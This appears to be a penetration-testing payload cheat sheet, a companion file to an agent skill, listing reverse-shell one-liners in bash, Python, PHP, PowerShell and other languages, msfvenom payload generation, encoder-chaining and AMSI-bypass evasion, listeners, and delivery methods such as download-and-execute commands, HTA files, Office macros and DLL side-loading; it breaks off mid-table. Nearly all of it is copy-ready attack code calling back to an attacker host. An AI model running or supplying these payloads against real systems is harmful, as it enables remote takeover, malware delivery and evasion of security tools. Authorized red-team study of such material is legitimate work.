# Payload Generation Payload Collection

> This file is a companion to `SKILL.md`, organizing common payloads for payload generation testing by attack type.
> Purpose: Quickly find payload construction patterns for specific scenarios, ready to copy for testing.
> All payloads are for authorized security testing only.

---

## Index

1. [Reverse Shells — One-Liners](#1-reverse-shells--one-liners)
2. [msfvenom Payload Generation](#2-msfvenom-payload-generation)
3. [Encoding and Evasion](#3-encoding-and-evasion)
4. [Listener Setup](#4-listener-setup)
5. [Shell Stabilization](#5-shell-stabilization)
6. [Nishang PowerShell Payloads](#6-nishang-powershell-payloads)
7. [Socat Encrypted Shells](#7-socat-encrypted-shells)
8. [Delivery Mechanisms](#8-delivery-mechanisms)

---

## 1. Reverse Shells — One-Liners

### Bash Reverse Shell

```bash
# Basic bash reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Bash reverse shell with UDP
bash -i >& /dev/udp/10.0.0.1/4444 0>&1

# Bash reverse shell using /bin/sh
/bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

### Python Reverse Shell

```bash
# Python3 reverse shell
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'

# Python3 reverse shell with base64 encoding
python3 -c "exec(__import__('base64').b64decode(__import__('sys').stdin.read()))" <<< "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOyBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsgcy5jb25uZWN0KCgiMTAuMC4wLjEiLDQ0NDQpKTsgb3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTsgc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p"
```

### Perl Reverse Shell

```bash
# Perl reverse shell
perl -e 'use Socket; $i="10.0.0.1"; $p=4444; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); connect(S,sockaddr_in($p,inet_aton($i))); open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");'
```

### PHP Reverse Shell

```bash
# PHP reverse shell
php -r '$sock=fsockopen("10.0.0.1",4444); exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP reverse shell with /bin/bash
php -r '$sock=fsockopen("10.0.0.1",4444); $proc=proc_open("/bin/bash",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'

# PHP reverse shell (long form for webshell)
php -r '$ip="10.0.0.1"; $port=4444; $sock=fsockopen($ip,$port); $descriptorspec=array(0=>$sock,1=>$sock,2=>$sock); $process=proc_open("/bin/bash",$descriptorspec,$pipes);'
```

### Ruby Reverse Shell

```bash
# Ruby reverse shell
ruby -rsocket -e 'f=TCPSocket.open("10.0.0.1",4444).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat Reverse Shells

```bash
# Netcat with -e (traditional, disabled in many modern builds)
nc -e /bin/sh 10.0.0.1 4444

# Netcat with -e (bash)
nc -e /bin/bash 10.0.0.1 4444

# Netcat without -e (using mkfifo)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f

# Netcat without -e (using bash redirection)
rm -f /tmp/p; mkfifo /tmp/p; cat /tmp/p | bash -i 2>&1 | nc 10.0.0.1 4444 > /tmp/p

# Busybox netcat (limited flags)
busybox nc 10.0.0.1 4444 -e /bin/sh
```

### PowerShell Reverse Shell (Windows)

```powershell
# PowerShell reverse shell (one-liner)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PowerShell reverse shell (base64 encoded)
# Generate: echo -n '<powershell_command>' | iconv -t utf-16le | base64 -w0
powershell -nop -enc <BASE64_ENCODED_COMMAND>
```

### Java Reverse Shell

```bash
# Java reverse shell
Runtime rt = Runtime.getRuntime(); String[] cmd = {"/bin/bash","-c","bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}; Process p = rt.exec(cmd);

# JSP webshell reverse shell
<%Runtime.getRuntime().exec("bash -c {echo,BASE64_ENCODED_SHELL}|{base64,-d}|{bash,-i}");%>
```

### Lua Reverse Shell

```bash
# Lua reverse shell
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### AWK Reverse Shell

```bash
# AWK reverse shell
awk 'BEGIN{s="/inet/tcp/0/10.0.0.1/4444";while(1){do{printf"$ "|&s;s|&getline c;if(c){while((c|&getline)>0)print$0|&s;close(c)}}while(c!="exit")}}'
```

---

## 2. msfvenom Payload Generation

### Platform-Specific Payloads

```bash
# List all payloads
msfvenom --list payloads

# List all formats
msfvenom --list formats

# List all encoders
msfvenom --list encoders

# Linux x86 ELF binary
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell_x86.elf

# Linux x64 ELF binary
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell_x64.elf

# Linux x64 meterpreter (staged)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o meterpreter.elf

# Windows x86 EXE
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell_x86.exe

# Windows x64 EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell_x64.exe

# Windows x64 meterpreter (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o meterpreter.exe

# Windows DLL payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o shell.dll

# macOS Mach-O binary
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f macho -o shell.macho

# Java JAR payload
msfvenom -p java/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f jar -o shell.jar

# Python payload
msfvenom -p python/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.py

# PHP payload
msfvenom -p php/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php

# JSP payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.jsp

# WAR payload (Tomcat)
msfvenom -p java/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war

# ASPX payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f aspx -o shell.aspx

# PowerShell script
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f ps1 -o shell.ps1
```

### Format Selection Reference

```bash
# Common output formats:
# exe     - Windows executable (x86)
# exe-only - Windows executable (no service wrapper)
# dll     - Windows DLL
# elf     - Linux ELF binary
# macho   - macOS Mach-O binary
# jar     - Java JAR
# war     - Java WAR (Tomcat deploy)
# py      - Python script
# ps1     - PowerShell script
# aspx    - ASP.NET page
# jsp     - JavaServer Page
# php     - PHP script
# hta-psh - HTML Application with PowerShell
# vba     - VBA macro code
# vba-psh - VBA macro with PowerShell
# raw     - Raw shellcode bytes
# c       - C code (unsigned char array)
# ruby    - Ruby script
# perl    - Perl script
# bash    - Bash script
```

### Staged vs Stageless Reference

```bash
# STAGED payload naming pattern (two parts, separated by /):
#   platform/arch/payload_type/transport
#   Example: windows/x64/meterpreter/reverse_tcp
#   Requires: multi/handler listener to serve second stage
#   Size: ~15KB (small, downloads full payload at runtime)

# STAGELESS payload naming pattern (underscore in transport):
#   platform/arch/payload_type_transport
#   Example: windows/x64/meterpreter_reverse_tcp
#   Requires: Only basic TCP listener needed
#   Size: ~200KB+ (large, fully self-contained)

# Generate both for comparison
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o staged.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o stageless.exe
ls -la staged.exe stageless.exe
```

---

## 3. Encoding and Evasion

### shikata_ga_nai Encoding

```bash
# Single encoder, 1 iteration
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -f exe -o encoded1.exe

# Single encoder, 5 iterations
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 5 -f exe -o encoded5.exe

# Single encoder, 10 iterations
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 10 -f exe -o encoded10.exe
```

### Multi-Encoder Chains

```bash
# Two-encoder chain (shikata_ga_nai -> zutto_dekiru)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 3 -f raw | \
  msfvenom -p - -e x64/zutto_dekiru -i 3 -f exe -o chain1.exe

# Three-encoder chain
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 3 -f raw | \
  msfvenom -p - -e x64/zutto_dekiru -i 3 -f raw | \
  msfvenom -p - -e x64/shikata_ga_nai -i 3 -f exe -o chain2.exe

# Encoder chain for x86 targets
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f raw | \
  msfvenom -p - -e x86/countdown -i 5 -f exe -o chain_x86.exe
```

### Custom BAD Characters

```bash
# Exclude specific bad characters (null byte, newline, carriage return)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -b '\x00\x0a\x0d' -f exe -o badchar_safe.exe

# Exclude extended bad character set
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -b '\x00\x0a\x0d\xff\x20\x25\x3c\x3e' -f exe -o safe.exe
```

### Shellter PE Injection

```bash
# Interactive shellter injection (follow prompts)
shellter -i

# Non-interactive injection into specific executable
shellter -i -f /path/to/legit.exe -p 1 -lhost 10.0.0.1 -lport 4444

# Injection with custom payload (mode 2 = custom shellcode)
# First generate raw shellcode:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shellcode.bin
# Then inject with shellter:
shellter -i -f /path/to/legit.exe -p 2 -s shellcode.bin
```

---

## 4. Listener Setup

### Netcat Listeners

```bash
# Basic netcat listener
nc -lvnp 4444

# Netcat with rlwrap (readline support)
rlwrap nc -lvnp 4444

# Netcat listener on specific interface
nc -lvnp 4444 -s 10.0.0.1

# Netcat keep-alive listener (re-listens after disconnect)
while true; do nc -lvnp 4444; done

# Netcat with verbose logging
nc -lvnp 4444 2>&1 | tee session.log
```

### Socat Listeners

```bash
# Basic socat TCP listener
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Socat PTY listener (full interactive terminal)
socat TCP-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0

# Socat encrypted listener (generate cert first)
openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 365 -out bind.crt
cat bind.key bind.crt > bind.pem
socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0 FILE:`tty`,raw,echo=0
```

### Metasploit Multi/Handler

```bash
# Interactive multi/handler for staged payloads
msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.1
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit

# One-liner multi/handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; set ExitOnSession false; exploit -j"

# Resource script for multi/handler (save as handler.rc)
cat > handler.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
set ExitOnSession false
exploit -j
EOF
msfconsole -r handler.rc

# Multi/handler for Linux payload
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit"

# AutoRunScript for post-exploitation on session
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; set AutoRunScript post/windows/manage/migrate; exploit"
```

---

## 5. Shell Stabilization

### Python PTY Upgrade

```bash
# Step 1: Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell (Ctrl+Z)
# Step 3: Configure terminal
stty raw -echo; fg

# Step 4: Set terminal environment
export TERM=xterm
stty rows 38 cols 136

# Full one-shot stabilization (after catching shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter, Enter
export TERM=xterm; stty rows 38 cols 136
```

### rlwrap Stabilization

```bash
# Start listener with rlwrap for arrow keys and history
rlwrap nc -lvnp 4444

# rlwrap with Python upgrade for best results
# 1. Start: rlwrap nc -lvnp 4444
# 2. Catch shell, then: python3 -c 'import pty; pty.spawn("/bin/bash")'
# 3. Ctrl+Z, then: stty raw -echo; fg
# 4. export TERM=xterm
```

### Socat PTY Shell

```bash
# Attacker (listener) — provides full PTY
socat TCP-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0

# Target (connect back) — requests PTY
socat TCP:10.0.0.1:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane

# Alternative target command if socat binary name is unusual
socat TCP:10.0.0.1:4444 EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane

# Transfer socat to target if not present
# On attacker:
python3 -m http.server 8080
# On target:
curl http://10.0.0.1:8080/socat -o /tmp/socat && chmod +x /tmp/socat
```

### Socat Encrypted Shell

```bash
# Generate certificate on attacker machine
openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 365 -out bind.crt
cat bind.key bind.crt > bind.pem

# Attacker (encrypted listener)
socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0 FILE:`tty`,raw,echo=0

# Target (encrypted connect back)
socat OPENSSL:10.0.0.1:4443,verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

---

## 6. Nishang PowerShell Payloads

### Setup and Import

```bash
# Clone nishang repository
git clone https://github.com/samratashok/nishang.git /opt/nishang

# Import all scripts in PowerShell
Import-Module /opt/nishang/nishang.psm1

# Or import individual script
. /opt/nishang/Shells/Invoke-PowerShellTcp.ps1
```

### Invoke-PowerShellTcp (TCP Reverse Shell)

```powershell
# Basic TCP reverse shell
Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 4444

# TCP reverse shell with specific shell
Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 4444 -Shell PowerShell

# Bind shell (listen on target)
Invoke-PowerShellTcp -Bind -Port 4444
```

### Invoke-PowerShellUdp (UDP Reverse Shell)

```powershell
# UDP reverse shell
Invoke-PowerShellUdp -Reverse -IPAddress 10.0.0.1 -Port 4444
```

### Invoke-PowerShellWmi (WMI-based Shell)

```powershell
# WMI-based remote shell (no PSRemoting needed)
Invoke-PowerShellWmi -Reverse -IPAddress 10.0.0.1 -Port 4444
```

### Encoded PowerShell Delivery

```bash
# Generate base64-encoded PowerShell command for nishang
# 1. Write nishang invocation to file
echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 4444' > nishang_shell.ps1

# 2. Encode for -enc delivery (on Linux)
ICONV_CMD=$(echo "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 4444" | iconv -t utf-16le | base64 -w0)
echo "powershell -nop -enc $ICONV_CMD"
```

---

## 7. Socat Encrypted Shells

### Certificate Generation

```bash
# Generate self-signed certificate
openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 365 -out bind.crt

# Combine key and certificate
cat bind.key bind.crt > bind.pem

# Verify certificate
openssl x509 -in bind.pem -text -noout
```

### Encrypted Reverse Shell

```bash
# Attacker: Encrypted listener with PTY
socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0 FILE:`tty`,raw,echo=0

# Target: Encrypted connect-back with PTY
socat OPENSSL:10.0.0.1:4443,verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

### Encrypted Bind Shell

```bash
# Target: Encrypted bind shell
socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane

# Attacker: Connect to encrypted bind shell
socat OPENSSL:10.0.0.2:4443,verify=0 FILE:`tty`,raw,echo=0
```

### Socat Relay / Port Forwarding

```bash
# Port forwarding (relay traffic through pivot)
socat TCP-LISTEN:8888,fork TCP:10.10.10.5:80

# Forward local port through SSH tunnel
socat TCP-LISTEN:3389,fork TCP:192.168.1.100:3389

# SOCKS proxy via socat
socat TCP-LISTEN:1080,fork SOCKS4A:127.0.0.1:%h:%p,socksport=9050
```

---

## 8. Delivery Mechanisms

### Web Delivery (HTTP Server)

```bash
# Python HTTP server for payload delivery
python3 -m http.server 8080

# PHP built-in server
php -S 0.0.0.0:8080

# Target download commands:
# Linux:
curl http://10.0.0.1:8080/shell.elf -o /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf
wget http://10.0.0.1:8080/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf

# Windows (PowerShell):
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.0.0.1:8080/shell.exe','$env:TEMP\shell.exe');Start-Process $env:TEMP\shell.exe"

# Windows (certutil):
certutil -urlcache -split -f http://10.0.0.1:8080/shell.exe shell.exe && shell.exe
```

### Metasploit Web Delivery

```bash
# PowerShell web delivery (Target 2 = PSHT)
msfconsole -q -x "use exploit/multi/script/web_delivery; set TARGET 2; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; set SRVPORT 8080; exploit"

# Python web delivery (Target 0 = Python)
msfconsole -q -x "use exploit/multi/script/web_delivery; set TARGET 0; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit"

# Generates one-liner for target execution, e.g.:
# powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1:8080/xxx')"
```

### HTA (HTML Application) Delivery

```bash
# Generate HTA payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f hta-psh -o evil.hta

# Serve HTA with Python HTTP server
python3 -m http.server 8080

# Target opens: mshta http://10.0.0.1:8080/evil.hta

# Alternative: Metasploit HTA server
msfconsole -q -x "use exploit/windows/misc/hta_server; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set SRVPORT 8080; exploit"
# Target: mshta http://10.0.0.1:8080/xxx.hta
```

### Macro (Office Document) Delivery

```bash
# Generate VBA macro payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f vba-psh -o macro.txt

# The output contains VBA code to paste into Word/Excel macro editor
# Sub Document_Open() / AutoOpen()

# Manual VBA shell launcher:
# Insert into Word/Excel VBA editor (Alt+F11 -> ThisDocument)
Sub AutoOpen()
    Shell "powershell -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1:8080/shell.ps1')""", vbHide
End Sub

# Word macro with direct shellcode execution
Sub Document_Open()
    Dim cmd As String
    cmd = "powershell -nop -w hidden -enc <BASE64_COMMAND>"
    Shell cmd, vbHide
End Sub
```

### DLL Side-Loading

```bash
# Generate DLL payload for side-loading
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o evil.dll

# Rename DLL to match expected DLL name of target application
# Place evil.dll in the same directory as the legitimate executable
# When executable loads, it loads the malicious DLL instead

# Common DLL side-loading targets:
# - version.dll (loaded by many apps)
# - uxtheme.dll (loaded by Windows apps)
# - msdtc.dll (loaded by MSDTC service)

# Listener for DLL payload
nc -lvnp 4444
```

### HoaxShell Encrypted Delivery

```bash
# Start hoaxshell server (generates PowerShell one-liner)
hoaxshell -s -i 10.0.0.1 -p 4443 -t powershell

# hoaxshell generates a self-contained PowerShell command
# Copy and execute on target — no file drops, HTTPS encrypted

# Verify session
hoaxshell --list-sessions

# Interact with session
hoaxshell --interact <session_id>
```

---

## 9. Msfvenom Advanced Payload Formats

### Web Delivery Payloads

```bash
# Generate Python meterpreter with web delivery
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.py

# Generate JSP web shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.jsp

# Generate WAR file for Java application servers
msfvenom -p java/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war

# Generate Node.js reverse shell
msfvenom -p nodejs/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.js
```

### Encoder Chaining for Evasion

```bash
# Multiple encoding passes with different encoders
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe -o encoded_5.exe

# Encode with custom iterations and fallback encoder
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 -f raw | \
  msfvenom -p - -e x86/countdown -i 2 -f exe -o double_encoded.exe

# Generate with specific bad characters excluded
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -b '\x00\x0a\x0d\xff' -f c -o shellcode.c
```

### Format-Specific Payload Generation

```bash
# Generate PowerShell reflection payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f psh-reflection -o shell.ps1

# Generate C# source code payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f csharp -o ShellCode.cs

# Generate Ruby payload
msfvenom -p cmd/unix/reverse_bash LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.sh

# Generate Perl payload
msfvenom -p cmd/unix/reverse_perl LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.pl
```

### Staged vs Stageless Payload Comparison

```bash
# Staged payload (smaller initial footprint, downloads second stage)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o staged.exe

# Stageless payload (self-contained, larger but no second download)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o stageless.exe

# Compare sizes
ls -la staged.exe stageless.exe
# staged.exe: ~73KB, stageless.exe: ~200KB+ depending on features
```

### Cross-Platform Payload Generation

```bash
# Linux ELF binary payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o linux_shell

# macOS Mach-O payload
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f macho -o macos_shell

# Android APK payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o android_shell.apk

# Solaris SPARC payload
msfvenom -p solaris/sparc/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o sparc_shell
```

### Payload Delivery with Metasploit Web Delivery

```bash
# Start web delivery server for PowerShell payload
msfconsole -q -x "use exploit/multi/script/web_delivery; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set Target 2; run"

# Python web delivery
msfconsole -q -x "use exploit/multi/script/web_delivery; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set Target 0; run"
```

---

## 10. Payload Evasion and Anti-Analysis

### AMSI Bypass for PowerShell Payloads

```powershell
# AMSI bypass before executing payload (common technique)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative AMSI bypass via patching
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); $b=$a.GetField('amsiContext','NonPublic,Static'); $c=$a.GetField('amsiSession','NonPublic,Static'); $b.SetValue($null,[IntPtr]::Zero); $c.SetValue($null,$null)
```

### Payload Obfuscation with XOR

```python
#!/usr/bin/env python3
"""XOR-encode shellcode to evade static detection."""
import sys

def xor_encode(data, key):
    return bytes([b ^ key for b in data])

shellcode = bytes.fromhex(sys.argv[1]) if len(sys.argv) > 1 else b"\xcc\x90"
key = 0x42
encoded = xor_encode(shellcode, key)
print(f"Original: {shellcode.hex()}")
print(f"XOR key:  0x{key:02x}")
print(f"Encoded:  {encoded.hex()}")
```

---

## 11. Living Off The Land Binary (LOLBAS) Payloads

### Native Windows Payload Execution

```cmd
# Certutil download and execute
certutil -urlcache -split -f http://10.0.0.1/payload.exe C:\temp\payload.exe && C:\temp\payload.exe

# Bitsadmin download
bitsadmin /transfer n http://10.0.0.1/shell.exe C:\temp\shell.exe

# Mshta execution of remote HTA
mshta http://10.0.0.1:8080/evil.hta
```

### PowerShell Without PowerShell.exe

```cmd
# Use cscript to execute JScript payload
cscript //E:jscript //nologo payload.js

# Use msbuild to execute inline C# payload
msbuild inline_csharp.csproj
```

---

## 12. Payload Testing and Validation

### Payload Sandbox Testing

```bash
# Test payload in isolated sandbox (REMnux or cuckoo)
# Submit payload to Cuckoo sandbox for analysis
cuckoo submit --url /tmp/payload.exe

# Manual sandbox testing with strace
strace -f -o /tmp/payload_trace.log ./payload
grep -E "execve|socket|connect|open|write" /tmp/payload_trace.log | head -30
```

### Payload Encoding Validation

```bash
# Verify msfvenom payload is correctly generated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o test.exe
file test.exe
md5sum test.exe
msfvenom --payload windows/x64/shell_reverse_tcp --list-options
```

---

## 13. Payload Encoding Techniques

### XOR Shellcode Encoding

```python
#!/usr/bin/env python3
"""XOR-encode shellcode to evade static detection with custom key."""
import sys

def xor_encode(data, key):
    """XOR each byte of data with the key (cycling through key bytes)."""
    key_bytes = key if isinstance(key, bytes) else key.encode()
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])

def xor_encode_single(data, key_byte):
    """XOR each byte with a single key byte."""
    return bytes([b ^ key_byte for b in data])

# Read raw shellcode from msfvenom output
if len(sys.argv) < 2:
    print("Usage: python3 xor_encoder.py <shellcode_hex> [key]")
    sys.exit(1)

shellcode = bytes.fromhex(sys.argv[1])
key = sys.argv[2] if len(sys.argv) > 2 else "SecretKey"

encoded = xor_encode(shellcode, key)
print(f"Original:  {shellcode.hex()}")
print(f"Key:       {key}")
print(f"Encoded:   {encoded.hex()}")
print(f"Size:      {len(shellcode)} -> {len(encoded)} bytes")
```

### Base64 Payload Wrapping

```bash
# Wrap PowerShell payload in base64 for -enc delivery
CMD='IEX(New-Object Net.WebClient).DownloadString("http://10.0.0.1:8080/shell.ps1")'
ENCODED=$(echo -n "$CMD" | iconv -t utf-16le | base64 -w0)
echo "powershell -nop -enc $ENCODED"

# Generate base64-encoded Python payload
msfvenom -p python/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o raw_shell.py
base64 -w0 raw_shell.py > b64_shell.txt
echo "python3 -c \"exec(__import__('base64').b64decode(open('b64_shell.txt').read()))\""
```

### AES Encryption for Payload Storage

```python
#!/usr/bin/env python3
"""AES-encrypt shellcode for secure storage and transport."""
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os
import base64

def aes_encrypt(data, key):
    """Encrypt data with AES-256-CBC."""
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(data, AES.block_size)
    encrypted = cipher.encrypt(padded)
    return iv + encrypted  # Prepend IV for decryption

key = os.urandom(32)  # AES-256 key
shellcode = bytes.fromhex(sys.argv[1]) if len(sys.argv) > 1 else b"\xcc\x90"

encrypted = aes_encrypt(shellcode, key)
print(f"Key (base64): {base64.b64encode(key).decode()}")
print(f"Encrypted (base64): {base64.b64encode(encrypted).decode()}")
```

---

## 14. Staged vs Stageless Payload Reference

### Comparison Table

```
STAGED (e.g., windows/x64/meterpreter/reverse_tcp):
  - Size: ~15KB (small stager, downloads second stage at runtime)
  - Listener: MUST use multi/handler (serves second stage)
  - Network: Requires TWO connections (initial + second stage download)
  - Stealth: Better (smaller signature surface on disk)
  - Reliability: Lower (depends on second stage download succeeding)
  - Use when: Egress allows free outbound, need meterpreter features

STAGELESS (e.g., windows/x64/meterpreter_reverse_tcp):
  - Size: ~200KB+ (fully self-contained payload)
  - Listener: Any TCP listener (nc, socat, multi/handler)
